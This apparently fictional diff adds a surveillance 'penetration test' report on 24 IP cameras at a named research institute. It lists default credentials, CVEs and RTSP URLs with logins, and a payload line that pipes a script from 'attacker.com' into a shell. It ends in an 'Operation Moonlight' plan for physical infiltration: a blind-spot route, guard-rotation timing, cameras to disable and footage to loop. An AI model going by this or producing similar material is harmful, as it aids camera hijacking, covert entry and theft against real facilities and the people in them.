@@ -1,0 +1,296 @@
+# IP CAMERA NETWORK ANALYSIS
+# Novosibirsk Institute of Cybernetics
+# Surveillance System Penetration Test
+# Date: December 22, 23:15 (MSK)
+
+## NETWORK TOPOLOGY
+
+Building: Main Research Facility (3 floors, 100m x 100m)
+Total Cameras: 24 units
+Network: 192.168.1.0/24
+RTSP Port: 554 (default)
+Admin Panel: http://192.168.1.1:8080
+
+## CAMERA INVENTORY
+
+### FLOOR 1 - Ground Level (Public Access)
+ID: CAM-001
+Name: Entrance_Main
+IP: 192.168.1.101
+Location: Main entrance (50, 10)
+Type: DOME (Hikvision DS-2CD2142FWD)
+FOV: 90° / Range: 15m / Direction: 90° (East)
+Coverage: Entrance hall, visitor reception
+Status: ONLINE
+Default Credentials: YES (admin/12345)
+Vulnerability: CVE-2017-7921 (unauthorized access)
+
+ID: CAM-002
+Name: Entrance_Side
+IP: 192.168.1.102
+Location: Side entrance (55, 10)
+Type: BULLET (Dahua IPC-HFW4431S)
+FOV: 70° / Range: 12m / Direction: 120° (SE)
+Coverage: Emergency exit, parking lot view
+Status: ONLINE
+Default Credentials: YES (admin/admin)
+Vulnerability: Weak password, no encryption
+
+ID: CAM-003
+Name: Lobby_Reception
+IP: 192.168.1.103
+Location: Reception desk (50, 20)
+Type: PTZ (Axis P5624-E)
+FOV: 120° (pan 0-360°) / Range: 25m
+Coverage: Full lobby, can rotate
+Status: ONLINE
+Default Credentials: NO
+Vulnerability: Outdated firmware (2019)
+
+### FLOOR 2 - Research Labs (Restricted)
+ID: CAM-004
+Name: Corridor_A1
+IP: 192.168.1.104
+Location: Corridor section 1 (50, 30)
+Type: FIXED (Vivotek FD8166A)
+FOV: 60° / Range: 20m / Direction: 90° (East)
+Coverage: Corridor A1, lab entrances 201-205
+Status: ONLINE
+Default Credentials: YES (root/pass)
+Vulnerability: Telnet open (port 23)
+
+ID: CAM-005
+Name: Corridor_A2
+IP: 192.168.1.105
+Location: Corridor section 2 (50, 60)
+Type: FIXED (Vivotek FD8166A)
+FOV: 60° / Range: 20m / Direction: 90° (East)
+Coverage: Corridor A2, lab entrances 206-210
+Status: ONLINE
+Default Credentials: YES (root/pass)
+Vulnerability: Telnet open, same password cluster
+
+ID: CAM-006
+Name: Lab_Main_201
+IP: 192.168.1.106
+Location: Lab 201 - Main area (30, 35)
+Type: PTZ (Samsung SNP-6320H)
+FOV: 120° / Range: 25m
+Coverage: Main lab floor, equipment racks
+Status: ONLINE
+Default Credentials: NO
+Vulnerability: ONVIF exploit possible
+
+ID: CAM-007
+Name: Lab_Storage_203
+IP: 192.168.1.107
+Location: Lab 203 - Storage (20, 45)
+Type: DOME (Hikvision DS-2CD2142FWD)
+FOV: 90° / Range: 15m / Direction: 270° (West)
+Coverage: Equipment storage, server racks
+Status: ONLINE
+Default Credentials: YES (admin/12345)
+Vulnerability: Same as CAM-001, synchronized
+
+ID: CAM-008
+Name: Server_Room_210
+IP: 192.168.1.108
+Location: Server room entrance (70, 60)
+Type: BULLET (Dahua IPC-HFW4431S)
+FOV: 80° / Range: 12m / Direction: 180° (South)
+Coverage: Server room door (CRITICAL)
+Status: ONLINE
+Default Credentials: NO
+Vulnerability: Firmware buffer overflow (CVE-2020-25078)
+
+### FLOOR 3 - High Security (Directors, Classified)
+ID: CAM-009
+Name: Director_Office
+IP: 192.168.1.109
+Location: Director office (80, 80)
+Type: FIXED (Sony SNC-EB642R)
+FOV: 70° / Range: 15m / Direction: 225° (SW)
+Coverage: Director desk, safe (CLASSIFIED)
+Status: ONLINE
+Default Credentials: NO
+Vulnerability: NONE (new model, patched)
+
+ID: CAM-010
+Name: Classified_Vault
+IP: 192.168.1.110
+Location: Vault entrance (90, 90)
+Type: DOME (Axis P3367-VE)
+FOV: 90° / Range: 20m
+Coverage: Vault door, biometric scanner
+Status: ONLINE
+Default Credentials: NO
+Vulnerability: NONE (hardened)
+NOTE: Motion detection sensitivity = MAX
+
+### PERIMETER - Outdoor
+ID: CAM-011 through CAM-024
+IPs: 192.168.1.111 - 192.168.1.124
+Type: BULLET (weatherproof)
+Coverage: Building perimeter, parking, fence
+Status: 12 ONLINE, 2 OFFLINE (CAM-017, CAM-023)
+Default Credentials: 10 out of 14 = YES
+Vulnerabilities: Mass exposure
+
+## BLIND SPOTS IDENTIFIED
+
+### Critical Blind Spots (NO COVERAGE):
+1. **East Corridor Junction (75, 45)**
+   - Between CAM-005 and CAM-008
+   - Gap: 8 meters
+   - Risk: High (access to server room)
+   - Recommendation: ADD CAM-025
+
+2. **Stairwell B (85, 30)**
+   - No cameras on stairs
+   - Gap: 3 floors
+   - Risk: CRITICAL (bypass all floors)
+   - Recommendation: ADD 3 cameras
+
+3. **Loading Dock (15, 95)**
+   - Perimeter gap
+   - Gap: 12 meters
+   - Risk: High (vehicle access)
+   - Recommendation: ADD CAM-026
+
+4. **Ventilation Access (60, 5)**
+   - Roof access ladder
+   - Gap: Complete blind spot
+   - Risk: CRITICAL (physical bypass)
+   - Recommendation: ADD PTZ camera
+
+### Partial Coverage (LOW VISIBILITY):
+- Lab 204 corner (40, 50) - only 20% visible
+- Bathroom areas (30, 70) - privacy = security hole
+- Equipment closets - 8 locations, 0 cameras
+
+## SECURITY VULNERABILITIES
+
+### Authentication Issues:
+- Default credentials: 18 out of 24 cameras (75%)
+- Password reuse: "admin/12345" on 7 cameras
+- Password reuse: "root/pass" on 5 cameras
+- No password policy enforcement
+- No 2FA anywhere
+
+### Network Security:
+- All cameras on flat network (no VLAN segmentation)
+- Telnet enabled on 12 cameras
+- HTTP (no TLS) on 15 cameras
+- RTSP no authentication on 8 cameras
+- Port scan reveals: FTP (21), SSH (22), Telnet (23), HTTP (80), RTSP (554)
+
+### Firmware & Patches:
+- Outdated firmware: 16 cameras (2019-2020)
+- Known CVEs: 11 cameras vulnerable
+- Critical CVE-2021-36260 (Hikvision RCE): 4 cameras affected
+- No automatic updates
+- Last manual update: 14 months ago
+
+### Physical Security:
+- Cameras accessible from ground: 6 units
+- No tamper detection: 18 cameras
+- Power cables exposed: 8 cameras
+- Network cables exposed: 12 cameras
+- PoE switches unlocked: 3 locations
+
+## ATTACK VECTORS
+
+### 1. Direct Access (RTSP)
+```
+rtsp://admin:12345@192.168.1.101:554/stream1
+rtsp://root:pass@192.168.1.104:554/Streaming/Channels/101
+```
+Success rate: 75% (default credentials)
+
+### 2. Exploit CVE-2017-7921 (Hikvision)
+Affected: CAM-001, CAM-007, CAM-015, CAM-019
+Method: Unauthorized access via backdoor
+Payload: `wget http://attacker.com/hijack.sh | sh`
+
+### 3. Telnet Backdoor
+Affected: CAM-004, CAM-005, CAM-011 through CAM-018
+Method: Telnet login with root/pass
+Result: Full system access, can disable, modify, replace stream
+
+### 4. ONVIF Exploit
+Affected: CAM-006, CAM-009
+Method: ONVIF protocol authentication bypass
+Result: Camera control without credentials
+
+### 5. Physical Bypass
+Method: Use blind spots + disable 2 cameras (CAM-017 already offline)
+Route: Loading Dock → Stairwell B → Floor 3 → Vault
+Detection probability: <5% if done during 02:00-04:00 (guard rotation)
+
+## MOTION DETECTION ANALYSIS
+
+### High Activity Zones (Motion Events):
+- Entrance (CAM-001): 847 events/day (normal)
+- Corridor A1 (CAM-004): 234 events/day (normal)
+- Lab 201 (CAM-006): 67 events/day (normal)
+- Server Room (CAM-008): 12 events/day (normal)
+- Director Office (CAM-009): 3 events/day (normal)
+
+### Anomalies Detected:
+- CAM-023 (Perimeter): OFFLINE since Dec 19 (3 days)
+  └─ Last motion: Dec 19, 01:37 (unusual time)
+  └─ Possible tampering
+
+- CAM-017 (Perimeter): OFFLINE since Dec 20 (2 days)
+  └─ Last motion: Dec 20, 02:14 (unusual time)
+  └─ Pattern: Same method as CAM-023
+
+- CAM-006 (Lab 201): Motion spike on Dec 21, 23:00-02:00
+  └─ 89 events in 3 hours (normal: 2-3 events)
+  └─ After-hours activity = SUSPICIOUS
+
+## COVERAGE MAP
+
+Building footprint: 100m x 100m
+Grid resolution: 1m x 1m (10,000 cells)
+
+Coverage analysis:
+- Full coverage: 6,234 cells (62.3%)
+- Partial coverage: 2,156 cells (21.6%)
+- No coverage: 1,610 cells (16.1%) ← BLIND SPOTS
+
+Critical areas coverage:
+- Entrance: 95% ✓
+- Corridors: 78% ⚠️
+- Labs: 68% ⚠️
+- Server room: 85% ✓
+- Director floor: 45% ⚠️ (CRITICAL GAP)
+- Perimeter: 58% ⚠️ (2 cameras offline)
+
+## MISSION OBJECTIVE
+
+**PRIMARY:** Identify blind spots for physical infiltration
+**SECONDARY:** Find vulnerable cameras for stream manipulation
+**TERTIARY:** Map security guard patrol routes
+
+**FINDINGS:**
+✅ Blind spot route identified: Loading Dock → Stairwell B
+✅ Vulnerable cameras: 18 exploitable (75% success rate)
+✅ Guard patrol: Predictable (every 2 hours, 15 min route)
+
+**RECOMMENDATION FOR INFILTRATION:**
+- Time: 02:00-02:15 (guard rotation)
+- Entry: Loading Dock (blind spot)
+- Route: Stairwell B (no cameras)
+- Exit: Same route or Ventilation Access (roof)
+- Cameras to disable: CAM-008 (telnet), CAM-010 (if needed)
+- Stream replacement: CAM-006, CAM-008 (loop 30 min footage)
+
+**RISK LEVEL:** Medium (if executed during optimal window)
+**DETECTION PROBABILITY:** 8% (based on current security posture)
+
+---
+
+**CLASSIFIED - OPERATION MOONLIGHT**
+**For authorized personnel only**
+
